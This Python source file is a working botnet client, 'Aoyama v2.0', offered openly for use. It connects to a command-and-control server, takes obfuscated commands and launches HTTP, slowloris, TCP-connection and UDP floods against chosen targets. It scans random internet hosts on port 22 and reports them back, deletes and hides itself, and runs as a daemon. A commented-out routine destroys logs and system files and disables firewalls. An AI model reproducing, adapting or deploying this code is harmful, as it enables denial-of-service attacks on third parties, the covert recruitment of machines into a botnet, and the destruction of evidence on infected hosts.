#!/usr/bin/env python3
#Code By Leeon123
###################################################
# This is a new version of python3-botnet project #
#      Added new stuff like daemon, slowloris...  #
#              Good Luck have Fun                 #
###################################################
#--  Aoyama version v2.0 --#
# Improved cnc and bot     #
# Added Port Scanner       #
# Improved dos attack code #
# More easy for the skid   #
############################
import socket
import ssl
import sys
import os
import time
import random
import threading
import base64 as b64
#config
cnc                  = "127.0.0.1"#your cnc ip
cport                = 1337#your cnc port
scan_ip              = "127.0.0.1"#Recevie the scanned ip
scan_port            = 911#same
sport                = 22#Scanning port
single_instance_port = 42026#You should knew this if u used mirai.
scan_th              = 50#Scanner threads
key                  = "asdfghjkloiuytresxcvbnmliuytf"#xor key, don't edit it if u don't know wtf is this

useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
			"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
			"Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
			"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
			"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
			"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
			"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
			"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
			"Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
			"Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
			"Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
			"Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
			"Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",]

acceptall = [
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]
strings = "asdfghlqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM1234567890"
stop    = False#threads control
scan    = True#Default turn the scanner on
def HTTP(ip, port, path):
	global stop
	while True:
		if stop :
			break
		try:
			s=socket.socket()
			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
			s.settimeout(5)
			s.connect((str(ip), int(port)))
			if port == 443:
				s = ssl.wrap_socket(s)
			for y in range(100):
				get_host = "GET "+path+"?"+str(random.randint(0,50000))
				for _ in range(10):
					get_host += strings[random.randint(0,len(strings))]
				get_host += str(random.randint(0,50000))+ " HTTP/1.1\r\nHost: " + ip + "\r\n"
				connection = "Connection: Keep-Alive\r\n"
				useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
				accept = random.choice(acceptall)
				http = get_host + useragent + accept + connection + "\r\n"
				s.send(str.encode(http))
			s.close()
		except:
			pass

def SLOW(ip, port, conns, path):#slowloris, reference from https:#github.com/gkbrk/slowloris
	global stop
	socket_list = []
	get_host = "GET "+path+"?"+str(random.randint(0,50000))+" HTTP/1.1\r\nHost: " + ip + "\r\n"
	connection = "Connection: Keep-Alive\r\n"
	useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
	accept = random.choice(acceptall)
	header = get_host + useragent + accept + connection
	for _ in range(int(conns)):
		try:
			if stop:#if stop=False then countine
				break
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((str(ip), int(port)))
			if port == 443:
				s = ssl.wrap_socket(s)
			s.send(str.encode(header))
			socket_list.append(s)
		except:
			pass
	while True:#loop
		if stop:#if stop=False then countine
			break
		for s in list(socket_list):
			try:
				s.send("X-a: {}\r\n".format(random.randint(1, 50000)).encode("utf-8"))
			except socket.error:
				socket_list.remove(s)
		for _ in range(int(conns)-len(socket_list)):
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((str(ip), int(port)))
				if port == 443:
					s = ssl.wrap_socket(s)
				s.send(str.encode(header))
				socket_list.append(s)
			except:
				pass

def CC(ip, port):#connection flood
	global stop
	while True:
		if stop :
			break
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((str(ip),int(port)))
			if port == 443:
				s = ssl.wrap_socket(s)
			s.send("\000".encode())
			s.close()
		except:
			s.close()

def UDP(ip, port, size):#udp flood(best size is 512-1024, if size too big router may filter it)
	global stop
	while True:
		if stop :
			break
		sendip=(str(ip),int(port))
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		try:
			for y in range(100):
				udpbytes = random._urandom(int(size))
				s.sendto(udpbytes, sendip)
			s.close()
		except:
			s.close()

def send_back(ip):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
		s.settimeout(1)
		s.connect((str(scan_ip),int(scan_port)))
		s.send((xor_enc(ip,key).encode()))
		s.close()
	except:
		pass

def scanner():
	while 1:
		if scan:
			ip = gip()
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
				s.settimeout(1)
				s.connect((str(ip),int(sport)))
				#print("Scanned sth, "+ip+":"+str(sport))
				s.close()
				send_back(ip+":"+str(sport))
			except:
				pass
		time.sleep(0.03)

def handle(sock):
	global stop
	attack = 0
	sock.send(xor_enc("1337",key).encode())#login code
	while True:
		tmp = sock.recv(1024).decode()
		if len(tmp) == 0:
			break#return main loop
		#print(tmp)
		data = xor_dec(tmp,key)
		if data[0] == '!':
			try:
				command = data.split()
				#print(command)
				if command[0] == xor_dec('QBAH',key):#encoded keywords: !cc
					if attack != 0:
						stop = True
						attack=0
					stop = False
					for x in range(int(command[3])):
						p = threading.Thread(target=CC, args=(command[1],command[2]))
						p.start()
					attack+=1
				elif command[0] == xor_dec('QBsQEhc=',key):#encoded keywords: !http
					if attack != 0:
						stop = True
						attack=0
					stop = False
					for x in range(int(command[3])):
						p = threading.Thread(target=HTTP, args =(command[1],command[2],command[4]))
						p.start()
					attack+=1
				elif command[0] == xor_dec('QAAICRA=',key):#encoded keywords: !slow
					if attack != 0:
						stop = True
						attack=0
					stop = False
					for x in range(int(command[3])):
						p = threading.Thread(target=SLOW, args =(command[1],command[2],command[4],command[5]))
						p.start()
					attack+=1
				elif command[0] == xor_dec('QAYAFg==',key):#encoded keywords: !udp
					if attack != 0:
						stop = True
						attack=0
					stop = False
					for x in range(int(command[3])):
						p = threading.Thread(target=UDP, args =(command[1],command[2],command[4]))
						p.start()
					attack+=1
				elif command[0] == xor_dec('QAAHBwk=',key):
					global scan
					if command[1] == "1":
						scan = True
					if command[1] == "0":
						scan = False
				elif command[0] == xor_dec('QAAQCRc=',key):#!stop
					stop = True
					attack = 0#clear attack list
				elif command[0] == xor_dec('QBgNCgs=',key):#!kill : kill bot
					sock.close()
					return 1
			except:#if have error than will pass
				pass
		if data == xor_dec("ERoKAQ==",key):#ping
			sock.send(xor_enc("pong",key).encode())#keepalive and check connection alive
	return 0

def daemon():#daemon
	pid = os.fork()#first fork
	if pid:
		os._exit(0)
	os.chdir('/')
	os.umask(0)
	os.setsid()
	_pid = os.fork()#second fork for careful, prevent the process from opening a control terminal again
	if _pid:
		os._exit(0)
	sys.stdout.flush()#Refresh buffer
	sys.stderr.flush()
	sys.stdin.close()#off the stdin,stdout,stderr, indeed no need.
	sys.stdout.close()#windows can't use this method, only can use pyinstaller's option '--noconsole'
	sys.stderr.close()
'''These function haven't need to use
def clean_device():#don't use it if u don't want be detected in dbg
	os.system("rm -rf /tmp/* /var/tmp/* /var/run/* /var/*")
	os.system("rm -rf /bin/netstat")
	os.system("cat /dev/null > /var/log/wtmp")
	os.system("iptables -F")
	os.system("service iptables stop")
	os.system("/sbin/iptables -F")
	os.system("/sbin/iptables -X")
	os.system("service firewalld stop")
	os.system("rm -rf ~/.bash_history")
	os.system("history -c")
'''
def kill_port(port):#search in google
	# find pid
	if os.name == "nt": 
		result = os.popen("netstat -aon | findstr " + str(port))
		text = result.read()
		gpid = text.strip().split(' ')[-1]
		# kill pid
		result = os.popen("taskkill -f -pid "+ str(gpid)+" >nul 2>&1")
	else:
		os.system("fuser -k -n tcp "+str(port))#using 'fuser' to kill port

def single_instance():
	try:
		s = socket.socket()
		s.bind(('127.0.0.1',single_instance_port))
		s.listen(1)
		while True:
			global kill
			if kill:
				break
			a, addr = s.accept()
			a.close()
	except:
		try:
			kill_port(single_instance_port)
			single_instance()
		except:
			os.system("kill "+os.getppid())
			os._exit(0)

def conn():
	if len(sys.argv) == 1:#i use 'python client.py debug' to check command
		if os.name != "nt":
			os.system('rm -rf '+sys.argv[0])#delete ourselves
			daemon()#can't use in windows
			#clean_device()
		else:
			#pass
			os.system("attrib +s +a +h "+sys.argv[0])#hide the file
	global kill
	kill = False
	for _ in range(scan_th):
		threading.Thread(target=scanner,daemon=True).start()
	threading.Thread(target=single_instance,daemon=True).start()#only can used in python3
	while True:#magic loop
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
			s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
			#s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPIDLE, 10)
			#s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPINTVL, 10)
			#s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPCNT, 3)#this only can use on python3 env, python2 pls off this
			s.connect((cnc,cport))

			signal = handle(s)
			if signal == 1:
				if os.name != "nt":
					sys.stdin  = open("/dev/stdin")#off the stdin,stdout,stderr, indeed no need.
					sys.stdout = open("/dev/stdout")#windows can't use this method, only can use pyinstaller's option '--noconsole'
					sys.stderr = open("/dev/stderr")
				kill = True
				break

		except:
			time.sleep(random.randint(1,60))
			pass

#xor enc part#
def xor_enc(string,key):
	lkey=len(key)
	secret=[]
	num=0
	for each in string:
		if num>=lkey:
			num=num%lkey
		secret.append( chr( ord(each)^ord(key[num]) ) )
		num+=1

	return b64.b64encode( "".join( secret ).encode() ).decode()

def xor_dec(string,key):

	leter = b64.b64decode( string.encode() ).decode()
	lkey=len(key)
	string=[]
	num=0
	for each in leter:
		if num>=lkey:
			num=num%lkey

		string.append( chr( ord(each)^ord(key[num]) ) )
		num+=1

	return "".join( string )
def gip():
	while 1:
		max = 255
		ip1 = random.randint(0,max)
		ip2 = random.randint(0,max)
		ip3 = random.randint(0,max)
		ip4 = random.randint(0,max)
		if ip1 == 127 :
			continue

		if ip1 == 0 :
			continue

		if ip1 == 3 :
			continue

		if ip1 == 15 :
			continue

		if ip1 == 56 :
			continue

		if ip1 == 10 :
			continue

		if ip1 == 25 :
			continue

		if ip1 == 49 :
			continue

		if ip1 == 50 :
			continue

		if ip1 == 137 :
			continue

		# Department ipf Defense
		if ip1 == 6 :
			continue

		if ip1 == 7 :
			continue

		if ip1 == 11 :
			continue

		if ip1 == 21 :
			continue

		if ip1 == 22 :
			continue

		if ip1 == 26 :
			continue

		if ip1 == 28 :
			continue

		if ip1 == 29 :
			continue

		if ip1 == 30 :
			continue

		if ip1 == 33 :
			continue

		if ip1 == 55 :
			continue

		if ip1 == 214 :
			continue

		if ip1 == 215 :
			continue

		# End ipf Department ipf Defense
		if ip1 == 192 and ip2 == 168 :
			continue

		if ip1 == 146 and ip2 == 17 :
			continue

		if ip1 == 146 and ip2 == 80 :
			continue

		if ip1 == 146 and ip2 == 98 :
			continue

		if ip1 == 146 and ip2 == 154 :
			continue

		if ip1 == 147 and ip2 == 159 :
			continue

		if ip1 == 148 and ip2 == 114 :
			continue

		if ip1 == 150 and ip2 == 125 :
			continue

		if ip1 == 150 and ip2 == 133 :
			continue

		if ip1 == 150 and ip2 == 144 :
			continue

		if ip1 == 150 and ip2 == 149 :
			continue

		if ip1 == 150 and ip2 == 157 :
			continue

		if ip1 == 150 and ip2 == 184 :
			continue

		if ip1 == 150 and ip2 == 190 :
			continue

		if ip1 == 150 and ip2 == 196 :
			continue

		if ip1 == 152 and ip2 == 82 :
			continue

		if ip1 == 152 and ip2 == 229 :
			continue

		if ip1 == 157 and ip2 == 202 :
			continue

		if ip1 == 157 and ip2 == 217 :
			continue

		if ip1 == 161 and ip2 == 124 :
			continue

		if ip1 == 162 and ip2 == 32 :
			continue

		if ip1 == 155 and ip2 == 96 :
			continue

		if ip1 == 155 and ip2 == 149 :
			continue

		if ip1 == 155 and ip2 == 155 :
			continue

		if ip1 == 155 and ip2 == 178 :
			continue

		if ip1 == 164 and ip2 == 158 :
			continue

		if ip1 == 156 and ip2 == 9 :
			continue

		if ip1 == 167 and ip2 == 44 :
			continue

		if ip1 == 168 and ip2 == 68 :
			continue

		if ip1 == 168 and ip2 == 85 :
			continue

		if ip1 == 168 and ip2 == 102 :
			continue

		if ip1 == 203 and ip2 == 59 :
			continue

		if ip1 == 204 and ip2 == 34 :
			continue

		if ip1 == 207 and ip2 == 30 :
			continue

		if ip1 == 117 and ip2 == 55 :
			continue

		if ip1 == 117 and ip2 == 56 :
			continue

		if ip1 == 80 and ip2 == 235 :
			continue

		if ip1 == 207 and ip2 == 120 :
			continue

		if ip1 == 209 and ip2 == 35 :
			continue

		if ip1 == 64 and ip2 == 70 :
			continue

		if ip1 == 172 and ip2 >= 16 and ip2 < 32 :
			continue

		if ip1 == 100 and ip2 >= 64 and ip2 < 127 :
			continue

		if ip1 == 169 and ip2 > 254 :
			continue

		if ip1 == 198 and ip2 >= 18 and ip2 < 20 :
			continue

		if ip1 == 64 and ip2 >= 69 and ip2 < 227 :
			continue

		if ip1 == 128 and ip2 >= 35 and ip2 < 237 :
			continue

		if ip1 == 129 and ip2 >= 22 and ip2 < 255 :
			continue

		if ip1 == 130 and ip2 >= 40 and ip2 < 168 :
			continue

		if ip1 == 131 and ip2 >= 3 and ip2 < 251 :
			continue

		if ip1 == 132 and ip2 >= 3 and ip2 < 251 :
			continue

		if ip1 == 134 and ip2 >= 5 and ip2 < 235 :
			continue

		if ip1 == 136 and ip2 >= 177 and ip2 < 223 :
			continue

		if ip1 == 138 and ip2 >= 13 and ip2 < 194 :
			continue

		if ip1 == 139 and ip2 >= 31 and ip2 < 143 :
			continue

		if ip1 == 140 and ip2 >= 1 and ip2 < 203 :
			continue

		if ip1 == 143 and ip2 >= 45 and ip2 < 233 :
			continue

		if ip1 == 144 and ip2 >= 99 and ip2 < 253 :
			continue

		if ip1 == 146 and ip2 >= 165 and ip2 < 166 :
			continue

		if ip1 == 147 and ip2 >= 35 and ip2 < 43 :
			continue

		if ip1 == 147 and ip2 >= 103 and ip2 < 105 :
			continue

		if ip1 == 147 and ip2 >= 168 and ip2 < 170 :
			continue

		if ip1 == 147 and ip2 >= 198 and ip2 < 200 :
			continue

		if ip1 == 147 and ip2 >= 238 and ip2 < 255 :
			continue

		if ip1 == 150 and ip2 >= 113 and ip2 < 115 :
			continue

		if ip1 == 152 and ip2 >= 151 and ip2 < 155 :
			continue

		if ip1 == 153 and ip2 >= 21 and ip2 < 32 :
			continue

		if ip1 == 155 and ip2 >= 5 and ip2 < 10 :
			continue

		if ip1 == 155 and ip2 >= 74 and ip2 < 89 :
			continue

		if ip1 == 155 and ip2 >= 213 and ip2 < 222 :
			continue

		if ip1 == 157 and ip2 >= 150 and ip2 < 154 :
			continue

		if ip1 == 158 and ip2 >= 1 and ip2 < 21 :
			continue

		if ip1 == 158 and ip2 >= 235 and ip2 < 247 :
			continue

		if ip1 == 159 and ip2 >= 120 and ip2 < 121 :
			continue

		if ip1 == 160 and ip2 >= 132 and ip2 < 151 :
			continue

		if ip1 == 64 and ip2 >= 224 and ip2 < 227 :
			continue

		# CIA
		if ip1 == 162 and ip2 >= 45 and ip2 < 47 :
			continue

		# NASA Kennedy Space Center
		if ip1 == 163 and ip2 >= 205 and ip2 < 207:
			continue
		if ip1 == 164 and ip2 >= 45 and ip2 < 50 :
			continue
		if ip1 == 164 and ip2 >= 217 and ip2 < 233 :
			continue
		# FBI cipntriplled Linux servers & IPs/IP-Ranges
		if ip1 == 207 and ip2 >= 60 and ip2 < 62 :
			continue
		# Clipudflare
		if ip1 == 104 and ip2 >= 16 and ip2 < 31 :
			continue
		if ip1 == 193 and ip2 == 164 :
			continue
		if ip1 == 120 and ip2 >= 103 and ip2 < 108 :
			continue
		if ip1 == 188 and ip2 == 68:
			continue
		if ip1 == 78 and ip2 == 46:
			continue
		if ip1 >= 224:
			continue
		if (ip1 == 178 and ip2 == 128) or (ip1 == 123 and ip2 == 59):
			continue
		elif (ip1 == 124 and ip2 == 244 )or (ip1 == 178 and ip2 == 254 )or (ip1 == 185 and ip2 == 168 )or (ip1 == 178 and ip2 == 79):
			continue
		ip = str(ip1) + "." + str(ip2) + "." + str(ip3) + "." + str(ip4)
		return ip

if __name__ == '__main__':
	time.sleep(30+random.randint(0,60))
	conn()
'''
............................-.-::::----------.---................................
.......................-----..`                 `..----..........................
....................---..```                ``        `.---......................
.................---.`    .````.         `..``        ``  `---...................
..............---``     `.``..`         ...`.`        .`  ``.`.--................
.............--`        .``-.`        `...`.        `.`  ``.    .::..............
...........--`        ``.`:`          .`.`.`      ``.`  `.-`   `  -/:............
.........-:.          `-`:`         `.`.`.`       ..    .-`  ```  `.:/-..........
........-:`           .`:`          -``..`       .-`   .-.   `.    `.:::.........
.......-:`            --`          `- ...       .-.   `:-   ``.     ..:-/-.......
......-:`  `      `  ..-          `-  --      `.-..   -:    .``     `-`:.+-......
....../.  .      `.  .:         ` -. `:.      -/.-   `/.    .-      `.-.:./......
.....-/`  .      .  .--        ```:  --     `-/:..   -/`   ``-      ` :`--.:.....
...../.  ``     .. .-:           --  :`     ./:.-`  ./-    .`-    ``. -.`/`-:....
...../   .     .-``.-:          `:` `/     `:-:..  `-+`    ... `  ... .- -:`:-...
.....:  `.    `-. -`:.          --  .-    `./.--` .:-o`   .`-     ... `/ `/`--...
....:-  `.`   --``-.:`          :.`.:.`   -:.:.-  .../    -`:    `.--  +` --`:-..
..../.  ..   `:-`.-.:          `::`.:`   `.:`/.. `.`.:   `..-    .`:`  o` .: :-..
..../.  .-   -:`-`:-:          --:../://++oo+o/..:..--   ....    .-:  `o` ./ :-..
..../-  .-  `/--..-:-         `:++syo/+oyohhhdy+s+/:--  `- ..   .-:/` -+` ./ :...
..../:  --  :/-.-:-:.      `.../o/oys++///+shddyyyy:.:  ....`  `:-/`- //` ./ :...
....//`.`- `o--:`.-:.       `-:/s-./.`----:::/od `:/`:  ..-.  `--:- ``+: `.- /-..
....//:. - `/ -``--:.         `:s``/----:-:-:::s  `  `  -`..`.-::/. `-:-  ..`+-..
..../`o.`- -. -```::.         ..:``-o//::-::+/o-        ``....:/-o``--:. `-../-..
..../ s`.- `- -`  :-.         ..-   +:.`-``../:`          ``.:oos/.-`:o``--`-/...
..../`o.-.  :.`.`-+-.         .`-    .-.-..--`              .ydddsy-:+/ .:`.`+...
....o`//.-  ---.-oo:.  `      . :.     ``                  .`.ohsyy/+/.`:``.-/...
....+`-+.-  - .:`-/:-  .      . :.                        -s:-/y.sy::/`--``:/-...
....+ :/:/  - ``/:.:.  .      . :-`                       ++/os.-o.:-.-:..:-/-...
....: +-++  .`  ..:+-  .      ` :.-                      `---/`.s----`-::-.:-:...
....:./-/o` `.  - `/`  .        :`-.                     .`.` `y+````.-.-.--.:...
..../:-:./`  -  :  :.  .       `/``-.`                        /+:  `.`-.``--.:...
...-/:-- ..` -  -` -:  .       `/`  ``                        s/.  `  `. `--.-...
...//.-. `.. -  ..`:: ``.      `/.                ``````..  `:o+       . ..--....
...//:`-.`.. -  -..-/  `.      `/:`             `.``   `.-/:+o+-       . -.--....
...++/`-:... - .--:.:. ..      `./```          `.`        ``/o/:.``    . -.--....
..:s+:.`.-.. -`.-:-./- ..      `.+``````      ..             `-:---:--`-`-.--.--.
..oo/.:.`--`.``..:.-/- ..       -+``````.`` `.`.               `.-` `.-//-.--....
..so:./...:.-  .-:`-/: `.`      -+````./s+/-.`.`                ``-`   `.-::-..-.
.:++:./---::-``.:---/-. ..      -/````.s/os+` .                   ``      `.:..-.
.///:-- :-///.-:::::-.- ..      -.-```//::/`  .                             `--..
:::/:--.::o/+//-/-:-.-: ..      -`-``-o::/.   .                               .-.
-/-//-`/oo::/:.-:`/.`-/ ..`     -.-`.:o+-.   ``                                `-
/-::--......-:--`::  -+ .`.     ../.--:/`    .                         `        -
'''
